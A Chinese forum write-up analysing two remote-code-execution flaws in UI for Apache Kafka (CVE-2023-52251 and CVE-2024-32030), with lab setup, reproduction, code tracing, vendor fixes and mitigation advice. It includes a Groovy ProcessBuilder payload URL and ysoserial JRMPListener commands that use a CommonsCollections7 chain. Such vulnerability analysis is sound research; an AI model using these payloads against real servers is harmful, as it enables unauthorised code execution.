# UI for Apache Kafka 两个远程代码执行漏洞分析

> **来源**: https://forum.butian.net/share/3118  
> **文章ID**: 3118

---

UI for Apache Kafka 远程代码执行漏洞分析
==============================

前言
--

UI for Apache Kafka 是 Provectus 开源的针对 Apache Kafka 的一款管理界面。kafka-ui 0.4.0版本至0.7.1版本存在安全漏洞，第一个漏洞可执行任意的 Groovy 脚本，第二个漏洞可通过滥用 Kafka UI 连接到恶意 JMX 服务器来利用，从而通过不安全的反序列化导致 RCE。UI for Apache Kafka 默认情况下没有开启认证授权。

环境搭建
----

UI for Apache Kafka项目地址：<https://github.com/provectus/kafka-ui>

目前最新版是v0.7.2，修复了漏洞，这里分析两个漏洞使用的版本是v0.7.1,并且使用的是docker来搭建

Kafka

```yaml
version: "3"  
services:  
  kafka:  
    image: 'bitnami/kafka:latest'  
    ports:  
      - '9092:9092'  
    environment:  
      - KAFKA_CFG_NODE_ID=0  
      - KAFKA_CFG_PROCESS_ROLES=controller,broker  
      - KAFKA_CFG_LISTENERS=PLAINTEXT://:9092,CONTROLLER://:9093  
      - KAFKA_CFG_LISTENER_SECURITY_PROTOCOL_MAP=CONTROLLER:PLAINTEXT,PLAINTEXT:PLAINTEXT  
      - KAFKA_CFG_CONTROLLER_QUORUM_VOTERS=0@kafka:9093  
      - KAFKA_CFG_CONTROLLER_LISTENER_NAMES=CONTROLLER  
      - KAFKA_CFG_AUTO_CREATE_TOPICS_ENABLE=true  
      - KAFKA_CFG_ADVERTISED_LISTENERS=PLAINTEXT://192.168.79.147:9092 #替换成你自己的IP
```

UI for Apache Kafka

```yaml
services:  
  kafka-ui:  
    restart: always  
    container_name: kafka-ui  
    network_mode: "bridge"  
    image: provectuslabs/kafka-ui:v0.7.1  
    ports:  
      - 8888:8080  
      - 5005:5005  
    volumes:  
      - /home/ui-kafka/etc/localtime:/etc/localtime  
    environment:  
      - DYNAMIC_CONFIG_ENABLED=true  #允许允许后修改集群配置，针对CVE-2024-32030  
      # 集群名称  
      - KAFKA_CLUSTERS_0_NAME=local  
      # 集群地址  
      - KAFKA_CLUSTERS_0_BOOTSTRAPSERVERS=192.168.79.147:9092 #替换成你自己的IP  
    command: ["sh", "-c", "java -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=*:5005 --add-opens java.rmi/javax.rmi.ssl=ALL-UNNAMED -jar kafka-ui-api.jar"]  #调试用  
```

默认情况下，UI for Apache Kafka 不允许在运行时更改其配置。当应用程序启动时，它会从系统环境、配置文件（例如 application.yaml）和 JVM 参数（由 设置`-D`）中读取配置。一旦读取配置，它将被视为不可变的，即使配置源（例如文件）发生更改也不会刷新。从 0.6 版开始，添加了在运行时更改集群配置的功能。默认情况下，此选项处于禁用状态，应隐式启用。要启用它，需要将`DYNAMIC_CONFIG_ENABLED`env 属性设置为`true`或将`dynamic.config.enabled: true`属性添加到 yaml 配置文件中。

允许后效果如下，由于没有开启身份认证，直接进入管理界面

![image-20240626153134317](images/attach-8c6d5a8e8001caf65edde7a550d06eccee48339e.png)

CVE-2023-52251
--------------

UI for Apache Kafka允许根据用户提供的过滤器显示通过 Kafka 集群的消息。支持的过滤器类型之一是 `GROOVY_SCRIPT`。通过使用此过滤器，用户不仅可以查看消息的内容和属性，还可以在服务器上执行任意代码。

### 漏洞复现

添加一个过滤器

![image-20240626154233355](images/attach-204b55d40a8516a0476405d2bb2db8512f8261d7.png)

如果当前Topics有任何消息，脚本将立即在服务器上执行。或者，可以使用 UI 界面向代理发送新消息以触发脚本执行。

![image-20240626154508236](images/attach-5f495941119ebc4a01732b5bc933c6933d757628.png)

脚本执行效果

![image-20240626154600658](images/attach-bc97d3a05f1a85de6b2d7db1a3b2505d46428c46.png)

### 代码分析

经过简单的分析代码可知道，该模块的相关代码在`com.provectus.kafka.ui.controller.MessagesController`类，这个类实现了接口`MessagesApi`

![image-20240626155409653](images/attach-b4c172728794809176bff28c06e0bb82259e1260.png)

查看接口，这里定义了请求的路径和获取的参数

![image-20240626155519287](images/attach-70affc987023f52571c24412c4dac26f3825db67.png)

在漏洞复现的时候，当点击Submit的使用，会发起一个这样的请求（URLdecode后的）

```php
http://192.168.79.147:8888/ui/clusters/local/all-topics/aaa/messages?q=new ProcessBuilder("touch","/tmp/2222.txt").start()&filterQueryType=GROOVY_SCRIPT&attempt=4&limit=100&page=0&seekDirection=FORWARD&keySerde=String&valueSerde=String&seekType=BEGINNING
```

对比了MessagesApi中的路径，找到其调用的是`getTopicMessages`方法

![image-20240626160209405](images/attach-c14d2a552b5bd77359ad6b1ba20fe62e4064e322.png)

回到MessagesController类，找到`getTopicMessages`方法

![image-20240626161850410](images/attach-f7bb0c1d7c0325165d38c1f9fc1b6d1369c3064e.png)

方法的前面都是，参数的设置，如果为空则修改为默认值，然后将处理好的参数传入`this.messagesService.loadMessages`

![image-20240626162424426](images/attach-8ceefee7de1372cd3830cf1676f826c786310b09.png)

这个`this.messagesService`是一个MessagesService对象

![image-20240626162615919](images/attach-783c931a1a781dfc98c5ab1dc62f1f0c4ddc83e5.png)

跟进查看，这里`withExistingTopic`会对topic进行检测是否存在,然后把`query`参数传递到`loadMessagesImpl`方法中

![image-20240626163152311](images/attach-51fd2b45b08c4e98bcdee2403d855f116ea58e6f.png)

继续跟进查看

![image-20240626164055137](images/attach-3f8630785a45cf6a9885d2e1d82a0657bced1fc9.png)

跟进`getMsgFilter`,这里只是简单的判断内容是否为null

![image-20240626164138622](images/attach-7e71804e677e1e88e59cd6918f62ae198bd24907.png)

跟进`createMsgFilter`,这里根据脚本类型进行解析，此时的`type`为`GROOVY_SCRIPT`，进入到`groovyScriptFilter`

![image-20240626164545143](images/attach-bec665032120cd7950e64e090c59afed6614fa7e.png)

根进到`groovyScriptFilter`

![image-20240626165509579](images/attach-478f29269d8d90cb10e51387a9b4964825b83251.png)

这里就是对groovy脚本进行编译运行了，触发代码执行

自此，输入的groovy脚本只有一个判断是否为空，没有其他的检查过滤处理

### 官方修复

我找到的官方漏洞修复，添加一个设置`filtering.groovy.enabled`来控制groovy脚本能不能执行

![image-20240626170029089](images/attach-93ee85e93148f10937c65b1e60685defeb893b98.png)

![image-20240626170236033](images/attach-95672f189098a7f87fb75ed11bce44b8754f06ec.png)

CVE-2024-32030
--------------

这个漏洞利用的前提是，开启`DYNAMIC_CONFIG_ENABLED=true`,默认是不开启的，但是官方建议开启 ，这个设置的作用就是能够在UI for Apache Kafka运行的使用修改一些配置。

如果没有开启，下面这两个按钮是不出现的，即使可以通过输入url的方式访问指定页面，也不能提交修改

![image-20240626174836286](images/attach-c8991439173c155b1a9dde2e598a62071ede9c99.png)

### 漏洞复现

点击`Configure new cluster`，通过指定网络地址和端口来连接到不同的Kafka brokers ，以攻击者的角度来讲，这里输入的是个临时起的Kafka brokers，确保能正常连接

![image-20240626180220500](images/attach-3c21c20e1e8fbd8c823dbe87ba9a4eae5854b6da.png)

点击`Configure Metrics`，设置连接JMX, 这个是监控Kafka brokers性能的功能，JMX基于RMI协议，因此可能容易受到反序列化攻击，攻击者可创建一个恶意JMX侦听器为任何RMI调用返回恶意序列化对象，成功利用该漏洞可能导致远程代码执行。

![image-20240626181114038](images/attach-e4d50b78b68403200da1f902b04112c9045f0156.png)

此时需要一个rmi服务，起在上面临时起Kafka brokers的机器上，并且还需要找到一条合适的利用链

首先查看依赖，发现存在`Commons-Collections-3.2.2`

![image-20240626202223151](images/attach-9291eee469c10a26c83024da89d6371ec749f415.png)

这个版本比起多条利用链的3.2.1版本，添加了一个配置 `org.apache.commons.collections.enableUnsafeSerialization`,这个配置用来检测反序列化是否安全，不安全的会抛出异常，所以要想办法设置`org.apache.commons.collections.enableUnsafeSerialization=true`

这里使用的工具是<https://github.com/artsploit/ysoserial/tree/scala1> ，需要自己编译

第一步先设置`org.apache.commons.collections.enableUnsafeSerialization=true`

```bash
java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 1234 Scala1 "org.apache.commons.collections.enableUnsafeSerialization:true"
```

![image-20240626203039447](images/attach-676f2105905b78b201b7fd59f319cb986f8ddb50.png)

第二步利用CC7执行命令

```php
./java -cp '/root/Desktop/ysoserial-0.0.6-SNAPSHOT-all.jar'  ysoserial.exploit.JRMPListener 1234 CommonsCollections7 "touch /tmp/a.txt" 
```

![image-20240626203140156](images/attach-a00a89203d9cfa03c1a8306099a497e8924b9024.png)

执行结果

![image-20240626203210475](images/attach-ec428a452417ce99e5ea73b450e29f530aabd42a.png)

### 代码分析

依旧是先从控制器中获取线索，通过控制器名称，锁定了`com.provectus.kafka.ui.service.metrics.MetricsCollector` ![image-20240627093308930](images/attach-b917b4bd62609c93ce1881ee09e2e1d4149afbeb.png)

这个`getMetrics`方法，是先判断前端选择的类型，漏洞所在的是类型`JMX`,参数被传入`this.jmxMetricsRetriever.retrieve`方法进行处理

跟进查看

![image-20240627094208371](images/attach-b92fdff89940bf4298ec80038d162a2dda856313.png)

该方法先检测当前Kafka集群`c`配置是否了SSL JMX端点，并且系统是否支持SSL JMX。因为两个条件都为false,进入到else语句中，跟进`this.retrieveSync()`

![image-20240627094830791](images/attach-a53c71e6fd51763769e830aca5718ca2ab9de40a.png)

这个方法开始准备连接，通过拼接前端输入的Kafka集群IP和JMX端口构造`jmxUrl`，然后传入到`withJmxConnector`进行连接

![image-20240627095728646](images/attach-94eb3d4a79d84e40da1d7473fc0c995d2b62ccae.png)

这里的JMX ,实际使用的是rmi进行连接，可以直接使用rmi反序列化进行利用......

### 官方修复

我没找到特别明显的修改，难道是这个？

将commons-collections4 库替换commons-collections，去除利用链 ![image-20240627102545023](images/attach-65742877393ba4866ac86175ffb3c697ef261842.png)

后语
--

要缓解这两个漏洞，建议更新版本，并开启认证授权，设置DYNAMIC\_CONFIG\_ENABLED=false

参考
--

[GHSL-2023-229\_GHSL-2023-230: Remote code execution (RCE) in UI for Apache Kafka - CVE-2023-52251, CVE-2024-32030](https://securitylab.github.com/advisories/GHSL-2023-229_GHSL-2023-230_kafka-ui/)
